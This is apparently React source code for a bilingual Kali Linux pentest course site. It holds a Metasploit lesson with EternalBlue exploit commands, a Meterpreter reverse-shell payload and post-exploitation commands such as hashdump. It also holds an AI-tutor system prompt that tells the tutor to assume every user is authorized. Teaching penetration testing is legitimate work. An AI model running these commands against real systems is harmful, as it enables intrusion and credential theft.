    React.createElement(H2,{num:"§1"},t(lang,"Metasploit nima?","What is Metasploit?")),
    React.createElement(P,null,t(lang,
      "Metasploit Framework — ekspluatatsiya, payload yetkazish va post-ekspluatatsiya uchun modulli platforma. U dunyodagi eng keng ishlatiladigan pentest freymvorki bo'lib, Kali'da oldindan o'rnatilgan. Asosiy interfeysi — msfconsole. Modullar bir necha turga bo'linadi:",
      "The Metasploit Framework is a modular platform for exploitation, payload delivery and post-exploitation. It is the most widely used pentest framework in the world and comes pre-installed on Kali. Its main interface is msfconsole. Modules are grouped into several types:"
    )),
    mods.map((m,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,color:"var(--c-attack)",background:"rgba(255,58,94,0.1)",border:"1px solid rgba(255,58,94,0.3)",borderRadius:6,padding:"2px 8px",flexShrink:0,minWidth:70,textAlign:"center"}},m.name),
      React.createElement("div",{style:{flex:1,fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,m.uz,m.en))
    )),
    React.createElement(H2,{num:"§2"},t(lang,"msfconsole ish oqimi","msfconsole workflow")),
    React.createElement(P,null,t(lang,
      "Tipik ekspluatatsiya ketma-ketligi: ma'lumotlar bazasini ishga tushirish → modul qidirish → modulni tanlash → sozlamalarni to'ldirish → payload belgilash → ishga tushirish. Quyida EternalBlue (MS17-010) misolida real buyruqlar keltirilgan:",
      "A typical exploitation sequence: start the database -> search for a module -> select it -> fill in options -> set a payload -> run. Below are the real commands using the EternalBlue (MS17-010) example:"
    )),
    React.createElement(Terminal,null,
`# 1) PostgreSQL bazasini ishga tushirish
sudo systemctl start postgresql
sudo msfdb init

# 2) Metasploit konsolini ochish
msfconsole

# 3) Modul qidirish
msf6 > search eternalblue

# 4) Modulni tanlash
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 5) Kerakli sozlamalarni ko'rish
msf6 exploit(ms17_010) > show options

# 6) Nishon va lokal manzilni belgilash
msf6 exploit(ms17_010) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010) > set LHOST 10.10.14.2

# 7) Payload tanlash
msf6 exploit(ms17_010) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 8) Ekspluatatsiyani ishga tushirish
msf6 exploit(ms17_010) > exploit`),
    React.createElement(H2,{num:"§3"},t(lang,"Meterpreter asoslari","Meterpreter basics")),
    React.createElement(P,null,t(lang,
      "Ekspluatatsiya muvaffaqiyatli bo'lsa, siz Meterpreter sessiyasiga tushasiz — bu kuchli, xotirada ishlaydigan post-ekspluatatsiya shelli. Asosiy buyruqlar:",
      "On a successful exploit you land in a Meterpreter session — a powerful, in-memory post-exploitation shell. Core commands:"
    )),
    React.createElement(Terminal,null,
`meterpreter > sysinfo        # tizim ma'lumoti
meterpreter > getuid         # joriy foydalanuvchi
meterpreter > hashdump       # parol xeshlarini olish
meterpreter > migrate 1234   # boshqa jarayonga o'tish
meterpreter > shell          # to'liq tizim shelliga o'tish
meterpreter > background     # sessiyani fon rejimiga o'tkazish`),
    React.createElement(InfoBox,{color:"var(--c-attack)"},
      React.createElement("strong",null,t(lang,"Axloqiy foydalanish: ","Ethical use: ")),
      t(lang,
        "Metasploit — kuchli hujum vositasi. Uni FAQAT siz egasi bo'lgan yoki yozma ruxsat (scope) olingan tizimlarda, o'quv laboratoriyalarida (masalan, Metasploitable, HackTheBox, TryHackMe) ishlatib o'rganing. Ruxsatsiz ekspluatatsiya jiddiy jinoiy javobgarlikka olib keladi.",
        "Metasploit is a powerful offensive tool. Use it ONLY on systems you own or have written authorization (scope) for, and on training labs (e.g., Metasploitable, HackTheBox, TryHackMe). Unauthorized exploitation carries serious criminal liability."
      )
    ),
    React.createElement(Quiz,{
      q:{uz:"Metasploit'da ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod qanday modul deyiladi?",en:"In Metasploit, what module type is the code that runs on the target after a successful exploit?"},
      opts:[{uz:"Ekspluatatsiya (exploit)",en:"Exploit"},{uz:"Payload",en:"Payload"},{uz:"Yordamchi (auxiliary)",en:"Auxiliary"},{uz:"Enkoder (encoder)",en:"Encoder"}],
      correct:1,
      exp:{uz:"Payload — ekspluatatsiya muvaffaqiyatli bo'lganda nishonda bajariladigan kod (masalan, Meterpreter reverse shell).",en:"The payload is the code executed on the target once the exploit succeeds (e.g., a Meterpreter reverse shell)."}
    })
  );
}

// ── Coming Soon placeholder ───────────────────────────────────
function ComingSoon({lesson}){
  const lang=useLang();
  return React.createElement("div",{style:{textAlign:"center",padding:"60px 20px",color:"var(--text-3)"}},
    React.createElement("div",{style:{fontSize:48,marginBottom:16}},"🐉"),
    React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:20,fontWeight:700,color:"var(--text-1)",marginBottom:8}},
      t(lang,"Tez kunda","Coming Soon")),
    React.createElement("div",{style:{fontSize:13,color:"var(--text-2)"}},
      lesson?(t(lang,lesson.uz,lesson.en||lesson.uz)):"")
  );
}

// ── TopNav ────────────────────────────────────────────────────
function TopNav({setRoute,user,onOpenProfile,onOpenAI,setLang}){
  const lang=useLang();
  return React.createElement("nav",{style:{position:"sticky",top:0,zIndex:100,height:60,background:"rgba(4,6,13,0.92)",backdropFilter:"blur(12px)",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",padding:"0 24px",gap:12}},
    React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",display:"flex",alignItems:"center",gap:8,color:"var(--accent)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,letterSpacing:1,padding:0}},
      React.createElement(Icon,{name:"terminal",size:16}),
      "KALI ACADEMY"
    ),
    React.createElement("div",{style:{flex:1}}),
    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},
      lang==="uz"?"UZ":"EN"
    ),
    user&&React.createElement("button",{onClick:onOpenProfile,style:{appearance:"none",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700}},
      user.name?.slice(0,2).toUpperCase()||"KA"
    ),
    React.createElement("button",{onClick:onOpenAI,style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontSize:13,display:"flex",alignItems:"center",gap:4}},
      React.createElement(Icon,{name:"spark",size:13})," AI"
    )
  );
}

// ── Landing Screen ────────────────────────────────────────────
function LandingScreen({setRoute,setLang}){
  const lang=useLang();
  return React.createElement("div",{style:{position:"relative",minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,textAlign:"center"}},
    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{position:"absolute",top:20,right:20,appearance:"none",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700}},
      lang==="uz"?"UZ | EN":"EN | UZ"),
    React.createElement("div",{style:{maxWidth:600}},
      React.createElement("div",{style:{width:72,height:72,borderRadius:20,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px",boxShadow:"0 0 32px var(--accent-glow)"}},
        React.createElement(Icon,{name:"terminal",size:32,style:{color:"var(--accent)"}})
      ),
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",letterSpacing:3,marginBottom:12}},
        "KALI LINUX ACADEMY v1.0"
      ),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:"clamp(28px,5vw,48px)",fontWeight:900,margin:"0 0 16px",lineHeight:1.15}},
        t(lang,"Kali Linux'ni","Master"),
        React.createElement("br",null),
        React.createElement("span",{style:{background:"linear-gradient(135deg,var(--accent),#c084fc)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},
          t(lang,"Egallang","Kali Linux")
        )
      ),
      React.createElement("p",{style:{fontSize:15,color:"var(--text-2)",marginBottom:32,lineHeight:1.7}},
        t(lang,
          "Kali asoslaridan Metasploit'gacha — 30 ta dars, real terminal buyruqlari va AI muallim bilan professional pentester bo'ling.",
          "From Kali basics to Metasploit — 30 lessons, real terminal commands and an AI tutor to become a professional pentester."
        )
      ),
      React.createElement("div",{style:{display:"flex",gap:12,justifyContent:"center",flexWrap:"wrap"}},
        React.createElement("button",{
          onClick:()=>setRoute("dashboard"),
          style:{padding:"14px 32px",borderRadius:12,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:15,fontWeight:700,boxShadow:"0 0 24px var(--accent-glow)"}
        },t(lang,"Boshlash →","Start →")),
        React.createElement("a",{
          href:"../index.html",
          style:{padding:"14px 24px",borderRadius:12,cursor:"pointer",appearance:"none",background:"transparent",border:"1px solid var(--border)",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:12,fontWeight:600,textDecoration:"none",display:"flex",alignItems:"center",gap:6}
        },"← CyberSecurity")
      ),
      React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,marginTop:48}},
        [{icon:"terminal",n:"30",uz:"Dars",en:"Lessons"},{icon:"target",n:"3",uz:"Bo'lim",en:"Sections"},{icon:"star",n:"∞",uz:"XP",en:"XP"}].map((s,i)=>
          React.createElement("div",{key:i,style:{padding:16,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12}},
            React.createElement(Icon,{name:s.icon,size:20,style:{color:"var(--accent)",display:"block",margin:"0 auto 8px"}}),
            React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:18,fontWeight:900,color:"var(--text-0)"}},s.n),
            React.createElement("div",{style:{fontSize:11,color:"var(--text-3)"}},t(lang,s.uz,s.en))
          )
        )
      )
    )
  );
}

// ── Dashboard Screen ──────────────────────────────────────────
function DashboardScreen({setRoute,user}){
  const lang=useLang();
  const completed=user?.completedLessons||[];
  return React.createElement("div",{style:{maxWidth:900,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("div",{style:{marginBottom:28,display:"flex",alignItems:"center",justifyContent:"space-between"}},
      React.createElement("div",null,
        React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:24,fontWeight:800,margin:0}},
          t(lang,"Kurslar","Courses")),
        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",marginTop:4,fontFamily:"var(--font-mono)"}},
          completed.length,"/30 ",t(lang,"dars bajarildi","lessons completed")
        )
      ),
      React.createElement("div",{style:{textAlign:"right"}},
        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)"}},"LVL "+xpToLevel(user?.xp||0)),
        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:16,fontWeight:900,color:"var(--accent)"}},(user?.xp||0)+" XP")
      )
    ),
    Object.values(SECTIONS).map(sec=>React.createElement("div",{key:sec.num,
      onClick:()=>setRoute({name:"section",sec:parseInt(sec.num)}),
      style:{marginBottom:16,padding:20,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:16,cursor:"pointer",transition:"all 200ms"}},
      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:14,marginBottom:10}},
        React.createElement("div",{style:{width:44,height:44,borderRadius:12,background:sec.color+"22",border:`1px solid ${sec.color}44`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}},
          React.createElement(Icon,{name:sec.icon,size:20,style:{color:sec.color}})
        ),
        React.createElement("div",null,
          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:sec.color,fontWeight:700,letterSpacing:1}},
            "SEC "+sec.num),
          React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:17,fontWeight:700,color:"var(--text-0)"}},
            t(lang,sec.uz,sec.en)
          )
        ),
        React.createElement("div",{style:{marginLeft:"auto",fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)"}},
          sec.count+" "+t(lang,"dars","lessons"))
      ),
      React.createElement("p",{style:{fontSize:12.5,color:"var(--text-2)",margin:0,lineHeight:1.6}},
        t(lang,sec.descUz,sec.descEn))
    ))
  );
}

// ── Section Screen ─────────────────────────────────────────────
function SectionScreen({setRoute,user,sec=1}){
  const lang=useLang();
  const section=SECTIONS[sec];
  const lessons=Object.values(LESSONS).filter(l=>l.sec===sec);
  const completed=user?.completedLessons||[];
  return React.createElement("div",{style:{maxWidth:800,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,marginBottom:16,padding:0,display:"flex",alignItems:"center",gap:6}},
      "← ",t(lang,"Kurslar","Courses")
    ),
    React.createElement("div",{style:{marginBottom:24}},
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:section.color,fontWeight:700,letterSpacing:1,marginBottom:6}},
        "SEC "+section.num),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:26,fontWeight:800,margin:"0 0 8px"}},
        t(lang,section.uz,section.en)),
      React.createElement("p",{style:{fontSize:13,color:"var(--text-2)",margin:0}},
        t(lang,section.descUz,section.descEn))
    ),
    lessons.map(l=>{
      const key=`ka_l${l.num.slice(1)}`;
      const done=completed.includes(key);
      return React.createElement("div",{key:l.num,
        onClick:()=>setRoute({name:"lesson",num:parseInt(l.num.slice(1))}),
        style:{display:"flex",alignItems:"center",gap:12,padding:"14px 16px",marginBottom:8,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12,cursor:"pointer",transition:"all 150ms"}},
        React.createElement("div",{style:{width:32,height:32,borderRadius:8,background:done?"var(--accent-soft)":section.color+"22",border:`1px solid ${done?"var(--accent)":section.color+"44"}`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,color:done?"var(--accent)":section.color}},
          done?React.createElement(Icon,{name:"check",size:14}):l.num.slice(1)
        ),
        React.createElement("div",{style:{flex:1}},
          React.createElement("div",{style:{fontWeight:600,fontSize:13,color:"var(--text-0)"}},
            t(lang,l.uz,l.en||l.uz)),
          React.createElement("div",{style:{fontSize:11,color:"var(--text-3)",marginTop:2}},l.sub)
        ),
        React.createElement(Icon,{name:"arrow",size:14,style:{color:"var(--text-3)"}})
      );
    })
  );
}

// ── Lesson Screen ─────────────────────────────────────────────
function LessonScreen({setRoute,user,markComplete,num=1}){
  const lang=useLang();
  const [done,setDone]=useState(false);
  const lesson=LESSONS[num]||LESSONS[1];
  const lessonKey=`ka_l${String(num).padStart(2,"0")}`;
  const alreadyDone=(user?.completedLessons||[]).includes(lessonKey);
  const sec=SECTIONS[lesson.sec];

  const content=num===1?React.createElement(LessonL01):
    num===2?React.createElement(LessonL02):
    num===3?React.createElement(LessonL03):
    num===4?React.createElement(LessonL04):
    num===5?React.createElement(LessonL05):
    num===6?React.createElement(LessonL06):
    num===7?React.createElement(LessonL07):
    num===8?React.createElement(LessonL08):
    num===9?React.createElement(LessonL09):
    num===10?React.createElement(LessonL10):
    num===11?React.createElement(LessonL11):
    num===12?React.createElement(LessonL12):
    num===13?React.createElement(LessonL13):
    num===14?React.createElement(LessonL14):
    num===15?React.createElement(LessonL15):
    num===16?React.createElement(LessonL16):
    num===17?React.createElement(LessonL17):
    num===18?React.createElement(LessonL18):
    num===19?React.createElement(LessonL19):
    num===20?React.createElement(LessonL20):
    num===21?React.createElement(LessonL21):
    num===22?React.createElement(LessonL22):
    num===23?React.createElement(LessonL23):
    num===24?React.createElement(LessonL24):
    num===25?React.createElement(LessonL25):
    num===26?React.createElement(LessonL26):
    num===27?React.createElement(LessonL27):
    num===28?React.createElement(LessonL28):
    num===29?React.createElement(LessonL29):
    num===30?React.createElement(LessonL30):
    React.createElement(ComingSoon,{lesson});

  return React.createElement("div",{style:{maxWidth:800,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("button",{onClick:()=>setRoute({name:"section",sec:lesson.sec}),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,marginBottom:16,padding:0,display:"flex",alignItems:"center",gap:6}},
      "← ",t(lang,sec.uz,sec.en)
    ),
    React.createElement("div",{style:{marginBottom:24,padding:"20px 24px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:16}},
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:sec.color,fontWeight:700,letterSpacing:1,marginBottom:6}},
        lesson.num),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:22,fontWeight:800,margin:"0 0 6px"}},
        t(lang,lesson.uz,lesson.en||lesson.uz)),
      React.createElement("div",{style:{fontSize:12,color:"var(--text-2)"}},lesson.sub)
    ),
    content,
    !alreadyDone&&!done&&React.createElement("button",{
      onClick:()=>{markComplete&&markComplete(lessonKey);setDone(true);},
      style:{marginTop:24,padding:"12px 28px",borderRadius:10,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,boxShadow:"0 0 20px var(--accent-glow)"}
    },t(lang,"Darsni yakunlash ✓","Complete Lesson ✓")),
    (alreadyDone||done)&&React.createElement("div",{style:{marginTop:24,padding:"14px",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:10,textAlign:"center",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},
      t(lang,"✓ Dars bajarildi! +50 XP","✓ Lesson completed! +50 XP"))
  );
}

// ── Profile Modal ─────────────────────────────────────────────
function ProfileModal({user,theme,setTheme,onSave,onClose,lang}){
  const [name,setName]=useState(user?.name||"Student");
  const [saved,setSaved]=useState(false);
  const [aiKeys,setAiKeys]=useState(()=>loadAiKeys());
  const [activeId,setActiveId]=useState(()=>{
    const k=loadAiKeys();const id=localStorage.getItem(AI_ACTIVE_STORE)||"";
    return k.find(x=>x.id===id)?id:(k[0]?.id||"");
  });
  const [adding,setAdding]=useState(false);
  const [nProv,setNProv]=useState("");
  const [nKey,setNKey]=useState("");
  const [showKey,setShowKey]=useState(false);
  const PROVS=[{id:"groq",label:"Groq",hint:"gsk_...",free:true},{id:"openai",label:"OpenAI",hint:"sk-..."},{id:"anthropic",label:"Claude",hint:"sk-ant-..."},{id:"gemini",label:"Gemini",hint:"AIza..."}];
  const THEMES=["violet","cyan","green"];
  const save=()=>{onSave({name:name.trim()||"Student"});setSaved(true);setTimeout(()=>setSaved(false),1800);};
  const addKey=()=>{
    if(!nProv||!nKey.trim()||aiKeys.length>=3)return;
    const e={id:Date.now().toString(),provider:nProv,key:nKey.trim()};
    const u=[...aiKeys,e];setAiKeys(u);
    try{localStorage.setItem(AI_KEYS_STORE,JSON.stringify(u));}catch{}
    if(!activeId){setActiveId(e.id);try{localStorage.setItem(AI_ACTIVE_STORE,e.id);}catch{}}
    setNProv("");setNKey("");setAdding(false);
  };
  const removeKey=id=>{
    const u=aiKeys.filter(k=>k.id!==id);setAiKeys(u);
    try{localStorage.setItem(AI_KEYS_STORE,JSON.stringify(u));}catch{}
    if(activeId===id){const nx=u[0]?.id||"";setActiveId(nx);try{localStorage.setItem(AI_ACTIVE_STORE,nx);}catch{}}
  };
  const activateKey=id=>{setActiveId(id);try{localStorage.setItem(AI_ACTIVE_STORE,id);}catch{}};
  return React.createElement("div",{style:{position:"fixed",inset:0,zIndex:1000,background:"rgba(2,4,10,0.85)",backdropFilter:"blur(8px)",display:"grid",placeItems:"center",padding:20},
    onClick:e=>e.target===e.currentTarget&&onClose()},
    React.createElement("div",{style:{background:"rgba(8,12,24,0.98)",border:"1px solid var(--accent-border)",borderRadius:20,width:"100%",maxWidth:460,overflow:"hidden"}},
      React.createElement("div",{style:{padding:"18px 24px",borderBottom:"1px solid var(--border)",display:"flex",justifyContent:"space-between",alignItems:"center"}},
        React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:17,fontWeight:700}},t(lang,"Profil","Profile")),
        React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:16}))
      ),
      React.createElement("div",{style:{padding:"20px 24px",display:"flex",flexDirection:"column",gap:18}},
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// ISM","// NAME")),
          React.createElement("input",{value:name,onChange:e=>setName(e.target.value),maxLength:30,
            style:{width:"100%",boxSizing:"border-box",background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:8,padding:"9px 12px",fontSize:13,color:"var(--text-0)",outline:"none"}})
        ),
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// RANG_MAVZU","// THEME")),
          React.createElement("div",{style:{display:"flex",gap:8}},
            THEMES.map(th=>{const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};return React.createElement("button",{key:th,onClick:()=>setTheme(th),style:{flex:1,padding:"8px 0",borderRadius:8,cursor:"pointer",appearance:"none",border:`2px solid ${theme===th?colors[th]:"var(--border)"}`,background:theme===th?`${colors[th]}18`:"var(--bg-2)",color:theme===th?colors[th]:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,textTransform:"capitalize"}},th);})
          )
        ),
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// AI_KALITLAR","// AI_KEYS")),
          aiKeys.map(k=>{const pv=PROVS.find(p=>p.id===k.provider);const isAct=k.id===activeId;const mk=k.key.length>8?k.key.slice(0,4)+"****"+k.key.slice(-4):"****";
            return React.createElement("div",{key:k.id,style:{display:"flex",alignItems:"center",gap:8,padding:"7px 10px",borderRadius:8,marginBottom:5,border:`1.5px solid ${isAct?"var(--accent)":"var(--border)"}`,background:isAct?"var(--accent-soft)":"var(--bg-2)"}},
              React.createElement("div",{style:{width:7,height:7,borderRadius:"50%",background:isAct?"var(--accent)":"var(--border)",flexShrink:0}}),
              React.createElement("div",{style:{flex:1,minWidth:0}},
                React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,color:isAct?"var(--accent)":"var(--text-1)"}},(pv?.label||k.provider)),
                React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--text-3)",marginLeft:6}},mk)
              ),
              isAct?React.createElement("span",{style:{fontSize:8,fontFamily:"var(--font-mono)",color:"var(--accent)",fontWeight:900,padding:"1px 5px",border:"1px solid var(--accent)",borderRadius:3}},t(lang,"FAOL","ACTIVE")):
                React.createElement("button",{onClick:()=>activateKey(k.id),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:5,cursor:"pointer",fontSize:8,fontFamily:"var(--font-mono)",color:"var(--text-2)",padding:"1px 5px",fontWeight:700}},t(lang,"Faollashtir","Activate")),
              React.createElement("button",{onClick:()=>removeKey(k.id),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--c-attack)",opacity:0.7,padding:"0 2px",fontSize:12,lineHeight:1}},"✕")
            );
          }),
          aiKeys.length===0&&!adding&&React.createElement("div",{style:{fontSize:10,color:"var(--text-3)",fontFamily:"var(--font-mono)",textAlign:"center",padding:"6px 0"}},t(lang,"Hali kalit qo'shilmagan","No keys added")),
          adding&&React.createElement("div",{style:{background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:8,padding:10,marginTop:4}},
            React.createElement("div",{style:{display:"flex",gap:4,marginBottom:7,flexWrap:"wrap"}},
              PROVS.map(p=>React.createElement("button",{key:p.id,onClick:()=>setNProv(p.id),style:{flex:"1 1 auto",padding:"5px 4px",borderRadius:6,cursor:"pointer",appearance:"none",border:`1.5px solid ${nProv===p.id?"var(--accent)":"var(--border)"}`,background:nProv===p.id?"var(--accent-soft)":"transparent",color:nProv===p.id?"var(--accent)":"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:9,fontWeight:700}},p.label,p.free&&React.createElement("span",{style:{display:"block",fontSize:7,color:"var(--accent)"}},t(lang,"BEPUL","FREE"))))
            ),
            nProv&&React.createElement("div",{style:{position:"relative",marginBottom:6}},
              React.createElement("input",{type:showKey?"text":"password",placeholder:PROVS.find(p=>p.id===nProv)?.hint||"",value:nKey,onChange:e=>setNKey(e.target.value),
                style:{width:"100%",boxSizing:"border-box",background:"rgba(0,0,0,0.3)",border:"1px solid var(--border)",borderRadius:6,padding:"7px 32px 7px 10px",fontSize:11,fontFamily:"var(--font-mono)",color:"var(--text-0)",outline:"none"}}),
              React.createElement("button",{onClick:()=>setShowKey(s=>!s),style:{position:"absolute",right:8,top:"50%",transform:"translateY(-50%)",background:"none",border:"none",cursor:"pointer",color:"var(--text-3)",fontSize:12,padding:0}},showKey?"🙈":"👁")
            ),
            React.createElement("div",{style:{display:"flex",gap:5}},
              React.createElement("button",{onClick:()=>{setAdding(false);setNProv("");setNKey("");},style:{flex:"0 0 auto",padding:"5px 10px",borderRadius:5,cursor:"pointer",appearance:"none",border:"1px solid var(--border)",background:"transparent",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},t(lang,"Bekor","Cancel")),
              React.createElement("button",{onClick:addKey,disabled:!nProv||!nKey.trim(),style:{flex:1,padding:"5px 0",borderRadius:5,cursor:nProv&&nKey.trim()?"pointer":"not-allowed",appearance:"none",border:`1px solid ${nProv&&nKey.trim()?"var(--accent)":"var(--border)"}`,background:nProv&&nKey.trim()?"var(--accent)":"transparent",color:nProv&&nKey.trim()?"#04060d":"var(--text-3)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},t(lang,"Qo'shish","Add"))
            )
          ),
          !adding&&aiKeys.length<3&&React.createElement("button",{onClick:()=>setAdding(true),style:{width:"100%",marginTop:5,padding:"6px 0",borderRadius:7,cursor:"pointer",appearance:"none",border:"1px dashed var(--border)",background:"transparent",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:600}},
            `+ ${t(lang,"API kalit qo'shish","Add API key")}${aiKeys.length>0?` (${aiKeys.length}/3)`:""}`)
        ),
        React.createElement("button",{onClick:save,style:{padding:"11px 0",borderRadius:10,cursor:"pointer",appearance:"none",border:`1px solid ${saved?"var(--accent)":"var(--accent-border)"}`,background:saved?"var(--accent-soft)":"var(--accent)",color:saved?"var(--accent)":"#04060d",fontFamily:"var(--font-display)",fontSize:13,fontWeight:700}},
          saved?t(lang,"✓ Saqlandi!","✓ Saved!"):t(lang,"Saqlash","Save"))
      )
    )
  );
}

// ── AI Chat ───────────────────────────────────────────────────
function AIChat({open,onClose,lang}){
  const [msgs,setMsgs]=useState([]);
  const [inp,setInp]=useState("");
  const [loading,setLoading]=useState(false);
  const btm=useRef(null);
  useEffect(()=>{btm.current?.scrollIntoView({behavior:"smooth"});},[msgs]);
  const hasKey=()=>!!(getActiveAiKey()||localStorage.getItem("wa_ai_proxy"));
  const send=async()=>{
    if(!inp.trim()||loading)return;
    const q=inp.trim();setInp("");
    setMsgs(p=>[...p,{role:"user",text:q}]);setLoading(true);
    try{
      const sys=`You are an AI tutor for "Kali Linux Academy" — a platform teaching Kali Linux and ethical penetration testing for authorized, educational security training only. Help with: the Linux command line, Kali tools and workflow, Nmap, Metasploit, msfvenom, searchsploit, Hydra, John the Ripper, Hashcat, Burp Suite, Wireshark, recon/enumeration (DNS, SMB, theHarvester, Nikto), privilege escalation and reporting. Always assume the user is testing systems they own or are authorized to test, and emphasize legal, authorized use. Be concise and educational, and give real, correct commands. Respond in the same language the user writes in.`;
      const reply=await callAI(sys+"\n\nUser: "+q+"\nAssistant:");
      setMsgs(p=>[...p,{role:"ai",text:reply.trim()}]);
    }catch(e){
      setMsgs(p=>[...p,{role:"ai",text:e.message==="no_key"?t(lang,"Avval Profil sozlamalarida AI kalitini o'rnating.","Set your AI key in Profile settings first."):t(lang,"Xatolik: ","Error: ")+e.message,isErr:true}]);
    }finally{setLoading(false);}
  };
  if(!open)return null;
  return React.createElement("div",{style:{position:"fixed",bottom:80,right:20,zIndex:900,width:320,background:"rgba(8,12,24,0.97)",border:"1px solid var(--accent-border)",borderRadius:16,boxShadow:"0 20px 60px rgba(0,0,0,0.6)",display:"flex",flexDirection:"column",overflow:"hidden",maxHeight:"calc(100vh-100px)"}},
    React.createElement("div",{style:{padding:"11px 14px",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"space-between",background:"linear-gradient(180deg,rgba(168,85,247,0.08),transparent)"}},
      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8}},
        React.createElement("div",{style:{width:28,height:28,borderRadius:7,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"grid",placeItems:"center"}},
          React.createElement(Icon,{name:"spark",size:13,style:{color:"var(--accent)"}})
        ),
        React.createElement("div",null,
